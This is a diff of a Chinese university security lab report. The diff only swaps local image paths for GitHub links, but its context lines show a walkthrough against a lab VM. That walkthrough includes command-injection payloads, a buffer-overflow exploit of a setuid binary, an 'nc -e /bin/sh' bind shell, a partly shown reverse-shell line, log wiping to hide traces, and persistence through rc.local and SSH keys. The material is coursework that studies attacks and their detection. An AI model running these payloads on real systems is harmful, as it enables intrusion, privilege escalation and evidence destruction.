@@ -31,7 +31,7 @@
 
    等待其安装、启动完毕，输入`root`进入账户，则攻击环境搭建完毕。运行结果如下：
 
-   ![Lab3-1](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-1.png)
+   ![Lab3-1](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-1.png?raw=true)
 
 2. **访问：**
 
@@ -39,7 +39,7 @@
 
    使用火狐浏览器打开结果如下：
 
-   ![Lab3-2](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-2.png)
+   ![Lab3-2](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-2.png?raw=true)
 
 3. **网络攻击：命令注入：**
 
@@ -51,7 +51,7 @@
 
    运行结果如下，可以看到成功注入的攻击指令`ls`显示出了`index.php`。
 
-   ![Lab3-3](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-3.png)
+   ![Lab3-3](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-3.png?raw=true)
 
 4. **攻击探测1：日志 I：**
 
@@ -68,7 +68,7 @@
 
    显示结果如下（省略了无用部分），这便是在第三小节中进行的网络攻击载荷的日志：
 
-   ![Lab3-4](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-4.png)
+   ![Lab3-4](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-4.png?raw=true)
 
 5. **攻击探测2：流量：**
 
@@ -88,13 +88,13 @@
 
    运行结果如下，下图为抓取到的包文件`tarffic.pcap`及使用`Wireshark`查看得到的攻击流量：
 
-   ![Lab3-5](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-5.png)
+   ![Lab3-5](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-5.png?raw=true)
 
-   ![Lab3-6](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-6.png)
+   ![Lab3-6](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-6.png?raw=true)
 
-   ![Lab3-7](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-7.png)
+   ![Lab3-7](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-7.png?raw=true)
 
-   ![Lab3-8](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-8.png)
+   ![Lab3-8](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-8.png?raw=true)
 
 6. **系统攻击：`setuid`权限提升**
 
@@ -110,9 +110,9 @@
 
    使用`Ghidra`逆向分析`hello`程序，发现其具有`setuid(0)`函数，且包含可被利用的缓冲区溢出漏洞。
 
-   ![Lab3-9](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-9.png)
+   ![Lab3-9](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-9.png?raw=true)
 
-   ![Lab3-10](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-10.png)
+   ![Lab3-10](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-10.png?raw=true)
 
    使用命令注入的方式，组织对`/bin/hello`程序的攻击。
 
@@ -122,7 +122,7 @@
 
    攻击结果如下：
 
-   ![Lab3-11](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-11.png)
+   ![Lab3-11](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-11.png?raw=true)
 
    可以看到`uid`已被置零，即获得了超级管理员权限。而对于进一步的操作，实验文档并没有给出指示，而笔者将尝试于**问题探究板块**讨论“提升权限后可以做的攻击操作”这一问题。
 
@@ -132,7 +132,7 @@
    (printf "AAAAAAAABBBBBBBBCCCCCCCC\xa9\x11\x40\0\0\0\0\0\n";sleep 1;echo 'nohup nc -l -k -p 2323 -e /bin/sh & sleep 1;')|/bin/hello
    ```
 
-   ![Lab3-25](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-25.png)
+   ![Lab3-25](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-25.png?raw=true)
 
 7. **攻击探测3：日志 II：**
 
@@ -146,7 +146,7 @@
 
    在得到的日志中可以看到攻击痕迹：
 
-   ![image-20231128171936952](C:\Users\20149\AppData\Roaming\Typora\typora-user-images\image-20231128171936952.png)
+   ![Lab3-29](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-29.png?raw=true)
 
    ```bash
    dmesg -c
@@ -168,7 +168,7 @@
 
    便可查看`/bin`目录下的文件
 
-   ![Lab3-12](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-12.png)
+   ![Lab3-12](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-12.png?raw=true)
 
    通过查阅博客[Web安全命令注入漏洞详解](https://blog.csdn.net/qq2539879928/article/details/106635907)，我了解到`Linux`系统下的常见命令注入方式。
 
@@ -188,7 +188,7 @@
 
    运行结果如下：
 
-   ![Lab3-13](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-13.png)
+   ![Lab3-13](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-13.png?raw=true)
 
    可以看出其没有显示`127.0.0.1`的输出结果，直接输出了`ls /var`的输出结果。
 
@@ -197,9 +197,9 @@
    q||ls /var
    ```
 
-   ![Lab3-14](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-14.png)
+   ![Lab3-14](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-14.png?raw=true)
 
-   ![Lab3-15](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-15.png)
+   ![Lab3-15](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-15.png?raw=true)
 
    可见`||`的执行情况为前一项为假，后一项才执行
 
@@ -208,9 +208,9 @@
    q&ls /var
    ```
 
-   ![Lab3-16](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-16.png)
+   ![Lab3-16](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-16.png?raw=true)
 
-   ![Lab3-17](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-17.png)
+   ![Lab3-17](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-17.png?raw=true)
 
    可见`&`的执行情况为，前一项为真则同时输出两者的运行结果，前一项为假则只输出后一项的运行结果。
 
@@ -219,9 +219,9 @@
    q&&ls /var
    ```
 
-   ![Lab3-18](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-18.png)
+   ![Lab3-18](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-18.png?raw=true)
 
-   ![Lab3-19](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-19.png)
+   ![Lab3-19](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-19.png?raw=true)
 
    可见`&&`的执行情况为，前一项为真时才输出二者的输出结果，否则不输出。
 
@@ -233,7 +233,7 @@
    q|find / -name "traffic.pcap"
    ```
 
-   ![Lab3-20](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-20.png)
+   ![Lab3-20](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-20.png?raw=true)
 
    并通过以下命令显示其内容。
 
@@ -241,7 +241,7 @@
    q|cat /home/juser/tmp/traffic.pcap
    ```
 
-   ![image-20231128200818579](C:\Users\20149\AppData\Roaming\Typora\typora-user-images\image-20231128200818579.png)
+   ![Lab3-30](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-30.png?raw=true)
 
    但是`rm`，`cp`等文件操作指令无法执行。
 
@@ -276,9 +276,9 @@
 
    攻击结果如下，成功显示、备份并删除了`access.log`文件：
    
-   ![Lab3-21](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-21.png)
+   ![Lab3-21](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-21.png?raw=true)
    
-   ![Lab3-22](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-22.png)
+   ![Lab3-22](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-22.png?raw=true)
    
 4. **擦除攻击痕迹**
 
@@ -320,9 +320,9 @@
    q|(printf "AAAAAAAABBBBBBBBCCCCCCCC\xa9\x11\x40\0\0\0\0\0\n";sleep 1;echo 'echo > /var/log/apache2/access.log';)|/bin/hello;
    ```
 
-   ![Lab3-23](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-23.png)
+   ![Lab3-23](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-23.png?raw=true)
 
-   ![Lab3-24](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-24.png)
+   ![Lab3-24](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-24.png?raw=true)
 
 
 **三、综合应用**
@@ -349,7 +349,7 @@ q|(printf "AAAAAAAABBBBBBBBCCCCCCCC\xa9\x11\x40\0\0\0\0\0\n";sleep 1;echo 'nc 19
 
 则得到的`shell`如图所示
 
-![Lab3-26](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-26.png)
+![Lab3-26](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-26.png?raw=true)
 
 查阅可知`Ubuntu`的启动项文件为`/etc/rc.local`。
 
@@ -391,7 +391,7 @@ q|(printf "AAAAAAAABBBBBBBBCCCCCCCC\xa9\x11\x40\0\0\0\0\0\n";sleep 1;echo 'echo 
 
 下显示附加公钥成功的`authorized_keys`文件
 
-![Lab3-27](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-27.png)
+![Lab3-27](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-27.png?raw=true)
 
 附加完毕后在本机使用下述指令进行登陆：
 
@@ -401,5 +401,5 @@ ssh -p 2222 root@127.0.0.1
 
 运行结果如下：
 
-![Lab3-28](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-28.png)
+![Lab3-28](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab3/Pic/Lab3-28.png?raw=true)
 
